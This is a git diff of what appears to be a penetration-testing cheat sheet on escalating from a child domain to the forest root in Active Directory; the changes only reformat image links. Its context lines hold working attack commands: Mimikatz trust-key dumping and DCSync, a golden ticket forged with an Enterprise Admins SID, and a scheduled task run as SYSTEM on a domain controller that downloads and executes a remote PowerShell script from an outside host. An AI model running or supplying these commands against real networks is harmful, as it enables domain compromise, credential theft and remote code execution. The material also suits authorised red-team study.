@@ -32,7 +32,7 @@ Can lead to Enterprise Admin compromise.
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc02
 ```
 
-![](../../../../.gitbook/assets/image%20%282%29.png)
+![](<../../../../.gitbook/assets/image (2) (1).png>)
 
 #### Second technique
 
@@ -40,7 +40,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc02
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:crook.badcorp.local /user:badcorp$"'
 ```
 
-![](../../../../.gitbook/assets/image%20%28176%29.png)
+![](<../../../../.gitbook/assets/image (176).png>)
 
 {% hint style="warning" %}
 To access to the Root forest, the domain controller in the child forest will create a TGT for Root forest DC and indicate that it’s a referral to a TGS. This TGT is not signed by the krbtgt password hash but instead with the trust key
@@ -51,14 +51,13 @@ To access to the Root forest, the domain controller in the child forest will cre
 #### Get krbtgt hash on the child domain
 
 ```csharp
-
 ```
 
 #### Golden Ticket
 
-* Domains SID 
+* Domains SID&#x20;
 
-![](../../../../.gitbook/assets/image%20%2854%29.png)
+![](<../../../../.gitbook/assets/image (54).png>)
 
 #### - Golden ticket :
 
@@ -66,7 +65,7 @@ To access to the Root forest, the domain controller in the child forest will cre
 Invoke-Mimikatz -command '"kerberos::golden /user:idontexit /domain:crook.badcorp.local /krbtgt:redacted /sid:S-1-5-21-xxxxxxxxx-xxxxxx-xxxxx /sids:S-1-5-21-xxxxxxx-xxxxxx-519 /ptt"'
 ```
 
-![](../../../../.gitbook/assets/image%20%28290%29.png)
+![](<../../../../.gitbook/assets/image (290).png>)
 
 ### Get shell
 
@@ -74,4 +73,3 @@ Invoke-Mimikatz -command '"kerberos::golden /user:idontexit /domain:crook.badcor
  schtasks /create /S DC.test.lab.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR  "powershell.exe -c 'iex (New-Object  Net.WebClient).DownloadString(''http://172.16.100.82/polo.ps1''')'"
  schtasks.exe /run /S DC.test.lab.local /TN "STCheck"
 ```
-
